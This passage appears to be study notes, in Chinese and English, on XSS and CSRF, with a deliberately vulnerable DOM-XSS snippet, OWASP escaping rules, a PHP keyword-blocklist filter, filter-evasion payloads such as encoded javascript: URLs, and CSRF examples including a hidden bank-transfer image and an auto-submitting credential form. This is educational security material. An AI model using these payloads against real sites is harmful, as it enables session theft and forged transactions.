<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">document.write(document.location.href.substring(document.location.href.indexOf("default=")+8));</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure>
<p>The malicious script can be embedded in the URL as follows in two ways:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://www.some.site/page.html?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div><div class="line">or </div><div class="line">http://www.some.site/page.html#default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>浏览器防护（自动URL编码）<br>%3Cscript%3Ealert(document.cookie)%3C/script%3E</p>
<h3 id="XSS-Ajax提交表单getshell"><a href="#XSS-Ajax提交表单getshell" class="headerlink" title="XSS Ajax提交表单getshell"></a>XSS Ajax提交表单getshell</h3><h2 id="XSS-Cross-Site-Scripting-Prevention-Cheat-Sheet"><a href="#XSS-Cross-Site-Scripting-Prevention-Cheat-Sheet" class="headerlink" title="XSS (Cross Site Scripting) Prevention Cheat Sheet"></a>XSS (Cross Site Scripting) Prevention Cheat Sheet</h2><p><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank" rel="external">https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</a></p>
<ol>
<li>仔细验证不可信数据</li>
<li>HTML实体编码 You MUST use the escape syntax for the part of the HTML document you’re putting untrusted data into.</li>
</ol>
<h4 id="XSS-Prevention-Rules"><a href="#XSS-Prevention-Rules" class="headerlink" title="XSS Prevention Rules"></a>XSS Prevention Rules</h4><p>RULE #0 don’t put untrusted data into your HTML document<br>RULE #1 HTML Escape<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&amp; --&gt; &amp;amp;</div><div class="line">&lt; --&gt; &amp;lt;</div><div class="line">&gt; --&gt; &amp;gt;</div><div class="line">&quot; --&gt; &amp;quot;</div><div class="line">&apos; --&gt; &amp;#x27;     &amp;apos; is in the XML and XHTML specs.</div><div class="line">/ --&gt; &amp;#x2F;     forward slash is included as it helps end an HTML entity</div></pre></td></tr></table></figure></p>
<p>RULE #2 - Attribute Escape<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"fname"</span> <span class="attr">value</span>=<span class="string">"UNTRUSTED DATA"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>RULE #3 - JavaScript Escape<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;var currentValue=&apos;UNTRUSTED DATA&apos;;&lt;/script&gt;</div><div class="line">&lt;script&gt;someFunction(&apos;UNTRUSTED DATA&apos;);&lt;/script&gt; </div><div class="line"></div><div class="line">//编码</div><div class="line">&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt; </div><div class="line">&amp;lt;SCRIPT&amp;gt;alert&amp;#x28;&amp;quot;XSS&amp;quot;&amp;#x29;&amp;lt;&amp;#x2f;SCRIPT&amp;gt;</div></pre></td></tr></table></figure></p>
<ul>
<li>Ensure JavaScript variables are quoted</li>
<li>JavaScript Hex Encoding</li>
<li>JavaScript Unicode Encoding</li>
<li>Avoid backslash encoding (\” or \’ or \)</li>
</ul>
<p>RULE #4 - CSS Escape And Strictly Validate<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width: UNTRUSTED DATA;"</span>&gt;</span>Selection<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></p>
<ul>
<li>CSS Hex encoding</li>
</ul>
<p>Except for alphanumeric characters, escape all characters with ASCII values less than 256 with the \HH escaping format.<br>RULE #5 - URL Escape<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=<span class="string">"/site/search?value=&lt;?php echo urlencode($_GET['url']) ?&gt;"</span>&gt;clickme&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<p>RULE #6 - Sanitize HTML Markup<br>PHP Html Purifier - <a href="http://htmlpurifier.org/" target="_blank" rel="external">http://htmlpurifier.org/</a><br>RULE #7 - Prevent DOM-based XSS</p>
<p>Others<br>Use HTTPOnly cookie flag</p>
<p>Code Filter</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">RemoveXSS</span><span class="params">($val)</span> </span>&#123; </div><div class="line">    <span class="comment">// remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed </span></div><div class="line">    <span class="comment">// this prevents some character re-spacing such as &lt;java\0script&gt; </span></div><div class="line">    <span class="comment">// note that you have to handle splits with \n, \r, and \t later since they *are* allowed in some          // inputs </span></div><div class="line">    $val = preg_replace(<span class="string">'/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/'</span>, <span class="string">''</span>, $val); </div><div class="line">     </div><div class="line">    <span class="comment">// straight replacements, the user should never need these since they're normal characters </span></div><div class="line">    <span class="comment">// this prevents like &lt;IMG SRC=@avascript:alert('XSS')&gt; </span></div><div class="line">    $search = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span>; </div><div class="line">    $search .= <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>; </div><div class="line">    $search .= <span class="string">'1234567890!@#$%^&amp;*()'</span>; </div><div class="line">    $search .= <span class="string">'~`";:?+/=&#123;&#125;[]-_|\'\\'</span>; </div><div class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($search); $i++) &#123; </div><div class="line">        <span class="comment">// ;? matches the ;, which is optional </span></div><div class="line">        <span class="comment">// 0&#123;0,7&#125; matches any padded zeros, which are optional and go up to 8 chars </span></div><div class="line"> </div><div class="line">        <span class="comment">// @ @ search for the hex values </span></div><div class="line">        $val = preg_replace(<span class="string">'/(&amp;#[xX]0&#123;0,8&#125;'</span>.dechex(ord($search[$i])).<span class="string">';?)/i'</span>, $search[$i], $val);<span class="comment">//with a ; </span></div><div class="line">        <span class="comment">// @ @ 0&#123;0,7&#125; matches '0' zero to seven times </span></div><div class="line">        $val = preg_replace(<span class="string">'/(&amp;#0&#123;0,8&#125;'</span>.ord($search[$i]).<span class="string">';?)/'</span>, $search[$i], $val); <span class="comment">// with a ; </span></div><div class="line">    &#125; </div><div class="line"> </div><div class="line">    <span class="comment">// now the only remaining whitespace attacks are \t, \n, and \r </span></div><div class="line">    $ra1 = <span class="keyword">Array</span>(<span class="string">'javascript'</span>, <span class="string">'vbscript'</span>, <span class="string">'expression'</span>, <span class="string">'applet'</span>, <span class="string">'meta'</span>, <span class="string">'xml'</span>, <span class="string">'blink'</span>, <span class="string">'link'</span>, <span class="string">'style'</span>, <span class="string">'script'</span>, <span class="string">'embed'</span>, <span class="string">'object'</span>, <span class="string">'iframe'</span>, <span class="string">'frame'</span>, <span class="string">'frameset'</span>, <span class="string">'ilayer'</span>, <span class="string">'layer'</span>, <span class="string">'bgsound'</span>, <span class="string">'title'</span>, <span class="string">'base'</span>); </div><div class="line">    $ra2 = <span class="keyword">Array</span>(<span class="string">'onabort'</span>, <span class="string">'onactivate'</span>, <span class="string">'onafterprint'</span>, <span class="string">'onafterupdate'</span>, <span class="string">'onbeforeactivate'</span>, <span class="string">'onbeforecopy'</span>, <span class="string">'onbeforecut'</span>, <span class="string">'onbeforedeactivate'</span>, <span class="string">'onbeforeeditfocus'</span>, <span class="string">'onbeforepaste'</span>, <span class="string">'onbeforeprint'</span>, <span class="string">'onbeforeunload'</span>, <span class="string">'onbeforeupdate'</span>, <span class="string">'onblur'</span>, <span class="string">'onbounce'</span>, <span class="string">'oncellchange'</span>, <span class="string">'onchange'</span>, <span class="string">'onclick'</span>, <span class="string">'oncontextmenu'</span>, <span class="string">'oncontrolselect'</span>, <span class="string">'oncopy'</span>, <span class="string">'oncut'</span>, <span class="string">'ondataavailable'</span>, <span class="string">'ondatasetchanged'</span>, <span class="string">'ondatasetcomplete'</span>, <span class="string">'ondblclick'</span>, <span class="string">'ondeactivate'</span>, <span class="string">'ondrag'</span>, <span class="string">'ondragend'</span>, <span class="string">'ondragenter'</span>, <span class="string">'ondragleave'</span>, <span class="string">'ondragover'</span>, <span class="string">'ondragstart'</span>, <span class="string">'ondrop'</span>, <span class="string">'onerror'</span>, <span class="string">'onerrorupdate'</span>, <span class="string">'onfilterchange'</span>, <span class="string">'onfinish'</span>, <span class="string">'onfocus'</span>, <span class="string">'onfocusin'</span>, <span class="string">'onfocusout'</span>, <span class="string">'onhelp'</span>, <span class="string">'onkeydown'</span>, <span class="string">'onkeypress'</span>, <span class="string">'onkeyup'</span>, <span class="string">'onlayoutcomplete'</span>, <span class="string">'onload'</span>, <span class="string">'onlosecapture'</span>, <span class="string">'onmousedown'</span>, <span class="string">'onmouseenter'</span>, <span class="string">'onmouseleave'</span>, <span class="string">'onmousemove'</span>, <span class="string">'onmouseout'</span>, <span class="string">'onmouseover'</span>, <span class="string">'onmouseup'</span>, <span class="string">'onmousewheel'</span>, <span class="string">'onmove'</span>, <span class="string">'onmoveend'</span>, <span class="string">'onmovestart'</span>, <span class="string">'onpaste'</span>, <span class="string">'onpropertychange'</span>, <span class="string">'onreadystatechange'</span>, <span class="string">'onreset'</span>, <span class="string">'onresize'</span>, <span class="string">'onresizeend'</span>, <span class="string">'onresizestart'</span>, <span class="string">'onrowenter'</span>, <span class="string">'onrowexit'</span>, <span class="string">'onrowsdelete'</span>, <span class="string">'onrowsinserted'</span>, <span class="string">'onscroll'</span>, <span class="string">'onselect'</span>, <span class="string">'onselectionchange'</span>, <span class="string">'onselectstart'</span>, <span class="string">'onstart'</span>, <span class="string">'onstop'</span>, <span class="string">'onsubmit'</span>, <span class="string">'onunload'</span>); </div><div class="line">    $ra = array_merge($ra1, $ra2); </div><div class="line">    </div><div class="line">    $found = <span class="keyword">true</span>; <span class="comment">// keep replacing as long as the previous round replaced something </span></div><div class="line">    <span class="keyword">while</span> ($found == <span class="keyword">true</span>) &#123; </div><div class="line">        $val_before = $val; </div><div class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; sizeof($ra); $i++) &#123; </div><div class="line">            $pattern = <span class="string">'/'</span>; </div><div class="line">            <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($ra[$i]); $j++) &#123; </div><div class="line">                <span class="keyword">if</span> ($j &gt; <span class="number">0</span>) &#123; </div><div class="line">                    $pattern .= <span class="string">'('</span>; </div><div class="line">                    $pattern .= <span class="string">'(&amp;#[xX]0&#123;0,8&#125;([9ab]);)'</span>; </div><div class="line">                    $pattern .= <span class="string">'|'</span>; </div><div class="line">                    $pattern .= <span class="string">'|(&amp;#0&#123;0,8&#125;([9|10|13]);)'</span>; </div><div class="line">                    $pattern .= <span class="string">')*'</span>; </div><div class="line">                &#125; </div><div class="line">                $pattern .= $ra[$i][$j]; </div><div class="line">            &#125; </div><div class="line">            $pattern .= <span class="string">'/i'</span>; </div><div class="line">            $replacement = substr($ra[$i], <span class="number">0</span>, <span class="number">2</span>).<span class="string">'&lt;x&gt;'</span>.substr($ra[$i], <span class="number">2</span>); <span class="comment">// add in &lt;&gt; to nerf the tag </span></div><div class="line">            $val = preg_replace($pattern, $replacement, $val); <span class="comment">// filter out the hex tags </span></div><div class="line">            <span class="keyword">if</span> ($val_before == $val) &#123; </div><div class="line">                <span class="comment">// no replacements were made, so exit the loop </span></div><div class="line">                $found = <span class="keyword">false</span>; </div><div class="line">            &#125; </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">    <span class="keyword">return</span> $val; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="XSS-Filter-Evasion"><a href="#XSS-Filter-Evasion" class="headerlink" title="XSS Filter Evasion"></a>XSS Filter Evasion</h2><p><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="external">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></p>
<ul>
<li>XSS Platform</li>
<li>XSS 编码</li>
<li>OWASP XSSER</li>
</ul>
<ol>
<li>编码</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">URL编码 空格（%20）</div><div class="line">HTML实体编码 &lt; (&amp;lt;)</div><div class="line">字符编码 十进制、十六进制ASCII码或unicode字符编码 &lt; (&amp;#60;)  &gt;(&amp;#62;)</div><div class="line">Js编码 &lt; (u003c) &gt;(u003e)</div><div class="line">CSS编码 \65</div></pre></td></tr></table></figure>
<p>HTML实体编码</p>
<table border="0" cellspacing="0" cellpadding="0"><br><tbody><br>    <tr><br>      <th style="width:20%">显示结果</th><br>      <th style="width:20%">描述</th><br>      <th style="width:30%">实体名称</th><br>      <th style="width:30%">实体编号</th><br>    </tr><br>    <tr><br>      <td>&nbsp;</td><br>      <td>空格</td><br>      <td>&amp;nbsp;</td><br>      <td>&amp;#160;</td><br>    </tr><br>    <tr><br>      <td>&lt;</td><br>      <td>小于号</td><br>      <td>&amp;lt;</td><br>      <td>&amp;#60;</td><br>    </tr><br>    <tr><br>      <td>&gt;</td><br>      <td>大于号</td><br>      <td>&amp;gt;</td><br>      <td>&amp;#62;</td><br>    </tr><br>    <tr><br>      <td>&amp;</td><br>      <td>和号</td><br>      <td>&amp;amp;</td><br>      <td>&amp;#38;</td><br>    </tr><br>    <tr><br>      <td>“</td><br>      <td>引号</td><br>      <td>&amp;quot;</td><br>      <td>&amp;#34;</td><br>    </tr><br>    <tr><br>      <td>‘</td><br>      <td>撇号&nbsp;</td><br>      <td>&amp;apos; (IE不支持)</td><br>      <td>&amp;#39;</td><br>    </tr><br></tbody><br></table>


<p>Unicode编码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"javascript:alert(/xss/)"</span>&gt;</span>click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#47;&amp;#41;"</span>&gt;</span>click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
<ol>
<li>单引号</li>
</ol>
<p><code>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</code></p>
<ol>
<li>其他</li>
</ol>
<p>使用tab键空开<br><code>&lt;IMG SRC=&quot;jav    ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p>
<p>编码tab<br><code>&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p>
<p>使用制表符, 换行符和回车符</p>
<blockquote>
<p>加入新行;&#10; Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. </p>
</blockquote>
<p><code>&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p>
<table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td>Type</td><br><td>Horizontal&nbsp;Tab</td><br><td>New line</td><br><td>Carriage&nbsp;Return</td><br></tr><br><tr><br><td>URL</td><br><td>%09</td><br><td>%10</td><br><td>%13</td><br></tr><br><tr><br><td>Minimal&nbsp;Sized&nbsp;Hex</td><br><td>&amp;#x9</td><br><td>&amp;#xA</td><br><td>&amp;#xD</td><br></tr><br><tr><br><td>Maximum&nbsp;Sized&nbsp;Hex</td><br><td>&amp;#x0000009;</td><br><td>&amp;#x000000A;</td><br><td>&amp;#x000000D;</td><br></tr><br><tr><br><td>Minimum&nbsp;Sized&nbsp;Decimal</td><br><td>&amp;#9</td><br><td>&amp;#10</td><br><td>&amp;#13</td><br></tr><br><tr><br><td>Maximum&nbsp;Sized&nbsp;Decimal</td><br><td>&amp;#x0000009;</td><br><td>&amp;#x0000009;</td><br><td>&amp;#0000009;</td><br></tr><br></tbody><br></table>

<h1 id="Cross-Site-Request-Forgery-CSRF-跨站脚本请求伪造"><a href="#Cross-Site-Request-Forgery-CSRF-跨站脚本请求伪造" class="headerlink" title="Cross-Site Request Forgery (CSRF) 跨站脚本请求伪造"></a>Cross-Site Request Forgery (CSRF) 跨站脚本请求伪造</h1><p>向服务器提交数据</p>
<p><img src="https://www.owasp.org//images/f/f3/Session_riding.GIF" alt=""></p>
<p>在a.com中访问b.com(或者受害者通过邮件点击访问example.com/delete?rule=*)，<strong>某些浏览器将自动发送其cookie</strong>。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://b.com/test.php"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div></pre></td></tr></table></figure></p>
<ul>
<li>自动删除文章</li>
<li>自动添加管理员账号</li>
</ul>
<p>GET scenario<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://bank.com/transfer.do?acct=MARIA&amp;amount=100000"</span> <span class="attr">width</span>=<span class="string">"0"</span> <span class="attr">height</span>=<span class="string">"0"</span> <span class="attr">border</span>=<span class="string">"0"</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>POST scenario<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- csrftest.html --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">'document.CSRF.submit()'</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- 如果表单中存在name='submit'会冲突 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">'http://tagetWebsite/Authenticate.jsp'</span> <span class="attr">method</span>=<span class="string">'POST'</span> <span class="attr">name</span>=<span class="string">'CSRF'</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'name'</span> <span class="attr">value</span>=<span class="string">'Hacked'</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'password'</span> <span class="attr">value</span>=<span class="string">'Hacked'</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>结合XSS漏洞攻击将悄无声息。</p>
<h4 id="Prevent-CSRF-Vulnerabilities"><a href="#Prevent-CSRF-Vulnerabilities" class="headerlink" title="Prevent CSRF Vulnerabilities"></a>Prevent CSRF Vulnerabilities</h4><ol>
<li><p>Check standard headers to verify the request is same origin </p>
<ul>
<li>Origin Header </li>
<li>Referer Header (绕过referer)</li>
</ul>
</li>
<li><p>AND Check CSRF token </p>
</li>
</ol>
<h4 id="same-origin-policy"><a href="#same-origin-policy" class="headerlink" title="same-origin policy"></a>same-origin policy</h4><blockquote>
<p>同源策略:同协议、域名、端口,不能跨域访问。</p>
</blockquote>
<p><img src="http://i.imgur.com/dswMO29.png" alt=""></p>
<p>如何实现跨域访问？</p>
<ol>
<li>Access-Control-Allow-Origin 头</li>
</ol>
<p>a.com 允许其他域访问本域资源<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> header(<span class="string">"Access-Control-Allow-Origin: *"</span>); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>b.com<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$.get(<span class="string">"http://a.com/test.php"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">alert(data);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<ol>
<li><p>getJSON</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$.getJSON(<span class="string">"http://www.runoob.com/try/ajax/jsonp.php?jsoncallback=?"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123; <span class="comment">// 对返回的json的处理代码 &#125;);</span></div></pre></td></tr></table></figure>
</li>
<li><p>iframe</p>
</li>
</ol>
<h4 id="跨域策略文件"><a href="#跨域策略文件" class="headerlink" title="跨域策略文件"></a>跨域策略文件</h4><p>crossdomain.xml</p>
]]></content>
      
        
    </entry>
    
  
  
    
  
</search>
